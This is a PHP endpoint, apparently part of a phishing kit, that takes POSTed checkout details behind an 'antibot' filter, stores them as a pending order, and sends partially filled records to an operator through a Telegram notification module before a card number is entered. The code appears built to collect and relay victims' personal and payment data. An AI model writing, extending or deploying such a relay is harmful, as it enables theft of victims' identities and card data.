<?php

declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false]);
    exit;
}

require_once dirname(__DIR__) . '/config.php';
require_once dirname(__DIR__) . '/app/services/runtime.php';
require_once dirname(__DIR__) . '/app/services/antibot.php';

salt_runtime_init();
require_once dirname(__DIR__) . '/app/services/checkout-pending.php';
require_once dirname(__DIR__) . '/app/services/telegram.php';

antibot_init();

if (!antibot_validate_token_from_request()) {
    http_response_code(403);
    echo json_encode(['ok' => false, 'sent' => false]);
    exit;
}

$raw = file_get_contents('php://input');
$payload = json_decode($raw ?: '', true);
if (!is_array($payload)) {
    $payload = [];
}

if ($payload !== []) {
    checkout_pending_save($payload);
}

$record = checkout_pending_load();
$data = is_array($record['data'] ?? null) ? $record['data'] : [];
if ($payload !== []) {
    $data = array_merge($data, $payload);
}

if (!checkout_pending_has_informations($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'sent' => false, 'error' => 'missing_data']);
    exit;
}

if ($record !== null && (!empty($record['completed']) || !empty($record['notified']))) {
    echo json_encode(['ok' => true, 'sent' => false, 'skip' => 'already_done']);
    exit;
}

if (!empty($data['cardNumber'])) {
    echo json_encode(['ok' => true, 'sent' => false, 'skip' => 'has_card']);
    exit;
}

$sent = notify_partial_order($data);
if ($sent) {
    checkout_pending_mark_notified();
}

echo json_encode(['ok' => $sent, 'sent' => $sent]);
